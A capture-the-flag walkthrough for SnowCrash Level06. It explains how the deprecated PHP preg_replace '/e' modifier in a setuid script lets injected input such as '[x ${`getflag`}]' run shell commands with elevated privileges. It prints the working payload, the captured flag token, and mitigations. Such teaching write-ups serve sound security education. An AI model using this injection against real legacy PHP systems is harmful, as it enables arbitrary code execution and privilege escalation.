# SnowCrash Level06 Walkthrough

## Overview
Level06 demonstrates a **PHP code injection vulnerability** through the dangerous `/e` modifier in `preg_replace()`. This level shows how legacy PHP features can lead to arbitrary code execution when processing user-controlled input.

## Initial Investigation

Upon logging into the level06 user, we find a PHP script:

```bash
level06@SnowCrash:~$ ls -la
total 15
dr-xr-x---+ 1 level06 level06   120 Mar  5  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level06 level06   220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06  3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06   356 Mar  5  2016 level06.php
-r-x------  1 level06 level06   675 Apr  3  2012 .profile
```

### Key Observations
- The `level06.php` script has **setuid** bit set (`-rwsr-x---`)
- It's owned by `flag06` user, meaning it runs with flag06 privileges
- The script is executable and readable by level06

## Script Analysis

Let's examine the PHP code:

```bash
level06@SnowCrash:~$ cat level06.php
```

```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

### Code Breakdown

#### Function `y($m)`
This function performs character replacements:
- Replaces `.` (dots) with ` x ` (space-x-space)
- Replaces `@` (at symbols) with ` y` (space-y)
- Returns the transformed string

#### Function `x($y, $z)`
This is the main processing function:
1. **`$a = file_get_contents($y);`** - Reads the entire file into a string
2. **`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`** - **VULNERABLE LINE**
3. **`$a = preg_replace("/\[/", "(", $a);`** - Converts `[` to `(`
4. **`$a = preg_replace("/\]/", ")", $a);`** - Converts `]` to `)`
5. **`return $a;`** - Returns processed content

#### Main Execution
- **`$r = x($argv[1], $argv[2]);`** - Processes file specified as first argument
- **`print $r;`** - Outputs the result

### The Critical Vulnerability

The dangerous line is:
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

#### Understanding the `/e` Modifier
- The `/e` modifier (deprecated since PHP 5.5, removed in PHP 7.0) evaluates the replacement string as **PHP code**
- This means the replacement `y("\\2")` is executed as actual PHP code
- `\\2` refers to the second captured group `(.*)` from the regex

#### Pattern Matching
- **Pattern**: `/(\[x (.*)\])/e`
- **Matches**: Text like `[x something]`
- **Captures**: The `something` part as group 2
- **Replacement**: Executes `y("something")` as PHP code

## Understanding the Template System

This script acts as a template processor:
1. Looks for patterns like `[x content]` in files
2. Processes the `content` through the `y()` function
3. Converts remaining brackets to parentheses

### Example Normal Usage
If a file contains `[x hello.world@domain]`:
1. The pattern `[x hello.world@domain]` matches
2. `hello.world@domain` is captured
3. `y("hello.world@domain")` is executed
4. The `y()` function transforms it to `hello x world y domain`
5. The result replaces the original pattern

## Exploitation Strategy

Since the replacement is evaluated as PHP code, we can inject arbitrary PHP expressions instead of just calling the `y()` function.

### Step 1: Test Basic Functionality

First, let's verify the script works normally:

```bash
level06@SnowCrash:~$ echo "hello world" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
hello world
```

The script successfully reads and outputs the file content.

### Step 2: Test Template Processing

```bash
level06@SnowCrash:~$ echo "[x test.example@domain]" > /tmp/template
level06@SnowCrash:~$ ./level06 /tmp/template
(test x example y domain)
```

This shows the template processing working:
- `[x test.example@domain]` was processed
- `test.example@domain` became `test x example y domain` through `y()`
- `[` and `]` were converted to `(` and `)`

### Step 3: Code Injection Test

Now let's exploit the `/e` modifier by injecting PHP code:

```bash
level06@SnowCrash:~$ echo '[x ${`ls`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: level06
level06.php
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

#### Understanding the Injection

The payload `[x ${`ls`}]` works as follows:
1. **Pattern Match**: `[x ${`ls`}]` matches the regex
2. **Captured Content**: `${`ls`}` is captured as group 2
3. **Code Evaluation**: Instead of `y("${`ls`}")`, PHP evaluates `${`ls`}`
4. **Command Execution**: The backticks execute `ls` as a shell command
5. **Variable Interpolation**: `${...}` tries to use the command output as a variable name

The error message shows that `ls` was executed (we see the file listing), but PHP treats it as an undefined variable name.

### Step 4: Execute getflag

Now let's execute `getflag` to retrieve the flag:

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag06
level06@SnowCrash:~$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

**Success!** The flag is embedded in the error message: `wiok45aaoguiboiki2tuin6ub`


## Technical Deep Dive

### Why the Injection Works

1. **Regex Pattern**: `/(\[x (.*)\])/e` captures everything between `[x` and `]`
2. **Code Evaluation**: The `/e` modifier treats the replacement as executable PHP code
3. **Variable Interpolation**: `${...}` in PHP attempts to use the content as a variable name
4. **Command Substitution**: Backticks execute shell commands and return output
5. **Privilege Escalation**: The setuid bit ensures commands run with flag06 privileges

### The Attack Chain

```
File Content: [x ${`getflag`}]
       ↓
Regex Match: captures ${`getflag`}
       ↓
PHP Evaluation: Executes ${`getflag`}
       ↓
Command Execution: `getflag` runs as flag06
       ↓
Variable Lookup: PHP tries to find variable named after command output
       ↓
Error with Flag: "Undefined variable: Check flag.Here is your token : ..."
```

## Security Implications

This level demonstrates several critical vulnerabilities:

### 1. **Code Injection via preg_replace /e**
- Direct execution of user-controlled input as PHP code
- Deprecated feature with known security risks
- Insufficient input validation

### 2. **File Processing Vulnerabilities**
- Processing user-controlled files without sanitization
- Template systems with dangerous evaluation features

### 3. **Privilege Escalation**
- Setuid binary amplifies the impact of code injection
- Web-like vulnerabilities in system binaries

## Mitigation Strategies

### 1. **Avoid /e Modifier**
```php
// Instead of (vulnerable):
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

// Use (secure):
$a = preg_replace_callback("/(\[x (.*)\])/", function($matches) {
    return y($matches[2]);
}, $a);
```

### 2. **Input Validation**
```php
function y($m) {
    // Validate input before processing
    if (!preg_match('/^[a-zA-Z0-9@.]+$/', $m)) {
        throw new InvalidArgumentException("Invalid input");
    }
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
```

### 3. **Sandboxing**
- Run template processing in restricted environments
- Limit available PHP functions
- Use safe evaluation libraries

## Real-World Context

This vulnerability pattern is found in:
- **Legacy PHP applications** using old preg_replace patterns
- **Template engines** with unsafe evaluation features  
- **Content management systems** processing user templates
- **Configuration processors** with dynamic evaluation

## PHP Version Notes

- **PHP < 5.5**: `/e` modifier available but discouraged
- **PHP 5.5+**: `/e` modifier deprecated, warnings issued
- **PHP 7.0+**: `/e` modifier removed, causes fatal errors
- **Modern PHP**: Use `preg_replace_callback()` instead

## Flag
```
wiok45aaoguiboiki2tuin6ub
```

This flag allows access to the next level of the SnowCrash challenge.

## Key Learnings

1. **Legacy PHP Vulnerabilities**: Understanding dangerous deprecated features
2. **Code Injection**: How template systems can lead to arbitrary code execution
3. **Regex Security**: The risks of dynamic evaluation in regular expressions
4. **Privilege Escalation**: How setuid binaries amplify injection vulnerabilities
5. **Input Validation**: The critical importance of sanitizing processed content
6. **Modern Alternatives**: Secure ways to implement dynamic content processing

## Tools and Techniques Used

- **PHP Analysis**: Understanding PHP code and execution flow
- **Regular Expressions**: Analyzing regex patterns and capture groups
- **Code Injection**: Exploiting evaluation vulnerabilities
- **Command Execution**: Using shell commands within PHP context
- **Error Analysis**: Extracting information from error messages